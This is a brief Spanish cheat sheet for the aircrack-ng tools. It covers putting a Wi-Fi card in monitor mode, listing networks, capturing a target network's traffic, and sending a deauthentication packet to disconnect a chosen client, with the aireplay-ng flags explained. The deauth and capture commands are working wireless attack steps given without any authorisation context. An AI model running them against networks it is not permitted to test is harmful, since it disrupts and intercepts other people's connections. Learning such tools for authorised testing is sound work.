· Detener cualquier proceso que use WLAN0:
$sudo airmon-ng check kill

· Interfaz modo monitor:
$sudo airmon-ng start wlan0

· Detener interfaz modo monitor:
$sudo airmon-ng stop <nombre_de_la_interfaz_monitoreada>

· Verificar estado Monitor:
$iwconfig

· Listar redes wifi:
$sudo airodump-ng wlan0mon

· Monitorizar trafico de una red en concreto:
$sudo airodump-ng --bssid BSSID --channel channel -w capturefile wlan0mon

· Mostrar datos capturados:
$sudo airodump-ng -r capturefile-01.cap

· Enviar paquete deauth:
$sudo aireplay-ng -0 1 -a BSSID -c STATION_MAC wlan0mon

-0: Indica que estás enviando un paquete de deautenticación.
1: Especifica el número de paquetes de deautenticación a enviar. Puedes cambiar este número si deseas enviar más paquetes.
-a BSSID: Especifica la dirección MAC del enrutador.
-c STATION_MAC: Especifica la dirección MAC de la estación que deseas deautenticar.
wlan0mon: Es el nombre de tu interfaz inalámbrica en modo monitor. Asegúrate de reemplazarlo si tu interfaz tiene un nombre diferente.



